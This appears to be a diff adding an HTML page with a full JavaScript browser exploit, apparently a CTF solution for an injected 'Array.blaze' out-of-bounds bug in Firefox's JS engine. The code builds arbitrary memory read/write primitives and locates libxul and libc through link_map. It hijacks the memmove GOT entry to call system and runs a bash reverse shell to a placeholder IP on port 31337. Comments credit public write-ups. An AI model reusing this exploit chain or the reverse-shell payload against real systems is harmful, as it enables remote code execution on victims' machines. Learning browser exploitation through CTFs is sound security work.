@@ -1,0 +1,163 @@
+<html>
+<script>
+    // Helper functions from https://bpsecblog.wordpress.com/2017/04/27/javascript_engine_array_oob/
+    // This article really helped!
+    
+    function d_to_i2(d) {
+        var a = new Uint32Array(new Float64Array([d]).buffer);
+        return [a[1], a[0]];
+    }
+
+    function i2_to_d(x) {
+        uint32_Convert[0] = x[1];
+        uint32_Convert[1] = x[0];
+        return f64[0];
+    }
+
+    function i2_to_hex(i2) {
+        var v1 = ("00000000" + i2[0].toString(16)).substr(-8);
+        var v2 = ("00000000" + i2[1].toString(16)).substr(-8);
+        return [v1, v2];
+    }
+
+    function p_i2(d) {
+        console.log(i2_to_hex(d_to_i2(d))[0] + i2_to_hex(d_to_i2(d))[1])
+    }
+
+    function p_int(d) {
+        console.log(i2_to_hex(d).join(''));
+    }
+
+    // Trigger it. It(Array.blaze) gives OOB access capability!
+
+    var oob_Array = new Array(1)
+    oob_Array[0] = 0x41414141
+
+    // After the array, TypedArray will exist by this line.
+    var uint32_Array = new Uint32Array(0x1337)
+    for (var i = 0; i < 0x1000; i = i + 1) {
+        uint32_Array[i] = 0x4141414141
+    }
+
+    // go
+    oob_Array.blaze();
+
+    // Let's find where typedarray exactly exists.
+    var buf = new ArrayBuffer(8);
+    var uint8_Array = new Uint8Array(buf);
+    var uint32_Convert = new Uint32Array(buf);
+    var f64 = new Float64Array(buf);
+    uint32_baseaddress_offset = 0
+
+    // Thanks for this code (from above link). I almost forgot how to find a TypedArray from heap.
+    for (i = 0; i < 0x1000; i++) {
+        if (oob_Array[i] == 0x1337) {
+            console.log('uInt32Array found');
+            uint32_baseaddress_offset = i + 2
+            //      oob_Array[i] = 0x13371337;
+            break;
+        }
+    }
+
+    // print array base. used when debugging it.
+    p_i2(oob_Array[uint32_baseaddress_offset]);
+
+    // read helper function
+    read64 = x => {
+        oob_Array[uint32_baseaddress_offset] = i2_to_d(x);
+        return [uint32_Array[1], uint32_Array[0]];
+    }
+
+    // write helper function
+    write64 = (x, y) => {
+        oob_Array[uint32_baseaddress_offset] = i2_to_d(x);
+        uint32_Array[0] = y[1];
+        uint32_Array[1] = y[0];
+    }
+    
+    // read string from given address
+    // It's used when finding library base
+    readstr = addr => {
+        var result = '';
+        if (addr[0] == 0 && addr[1] == 0) return '(nil)';
+        for (var i = 0; i < 100; i++) {
+            oob_Array[uint32_baseaddress_offset] = i2_to_d(addr);
+            addr[1]++;
+            x = uint32_Array[0] & 0xff;
+            if (x < 31 || x > 127) break;
+            result += String.fromCharCode(x);
+        }
+        return result;
+    }
+
+    // *(GOT+sizeof(void *)) has link_map pointer, and it's used on glibc's dl_iterate_phdr and lazy-binding thingy.
+    // pwntools' dynelf uses this, and it's extremely useful.
+    // 
+    // So what I'm trying to do here is find libxul.so base.
+    // I could use an ptr to libxul, but I was lazy to find it.
+    // 
+    // memmove GOT on libxul.so is used when TypedArray.copyWithin is called.
+    // memmove(dst, src, size), so dst will be the array's original data.
+    // I can call arbitrary(my_buffer) then.
+    // 
+    // This trick is from feuerfuchs reference exploit by saelo, thanks for the great challenge!
+    // (I couldn't solve it on 33c3...)
+    // https://github.com/saelo/feuerfuchs/blob/master/exploit/pwn.js
+    // 
+    // And thanks for Bruce Chen who wrote a really detailed and helpful analysis for this exploit.
+    // I could just insta-write my system("my_cmd") chain helped by this article and the code above!
+    // https://bruce30262.github.io/2017/12/15/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/
+    
+    cur = link_map = read64([0, 0x433ff0]);
+    xul = 0;
+    libc = 0;
+
+    // print link_map pointer. used when debugging.
+    p_int(cur);
+
+    // link_map is basically a linked list with library bases, and other things used in ld.so.
+    for (var i = 0; !xul || !libc; i++) {
+        addr = read64(cur);
+
+        // print library name. used when debugging.
+        console.log(name = readstr(read64([cur[0], cur[1] + 8])));
+
+        if (name.indexOf('xul') != -1) {
+            xul = addr;
+        } else if (name.indexOf('libc.so') != -1) {
+            libc = addr;
+        }
+        
+        // move to next pointer.
+        cur = read64([cur[0], cur[1] + 24])
+    }
+    
+    // js don't have int64 support. process carry.
+    if (xul[1] > 0xffffffff - 0x00000818b220 + 1)
+        xul[0] += 1;
+    
+    // memcpy GOT
+    xul[1] += 0x00000818b220;
+
+    // ... to system on libc
+    system = [libc[0], libc[1] + 0x00045390];
+    
+    p_int(system)
+
+    // backup pointer to memmove
+    memmove = read64(xul);
+    
+    p_int(xul);
+    p_int(libc);
+    
+    var target = new Uint8Array(100);
+    var cmd = "bash -c \"bash -i >& /dev/tcp/<my_ip>/31337 0>&1\"";
+    for (var i = 0; i < cmd.length; i++) {
+        target[i] = cmd.charCodeAt(i);
+    }
+    write64(xul, system);
+    target.copyWithin(0, 1);
+
+    // recover memmove GOT to real memmove
+    write64(xul, memmove);
+</script>
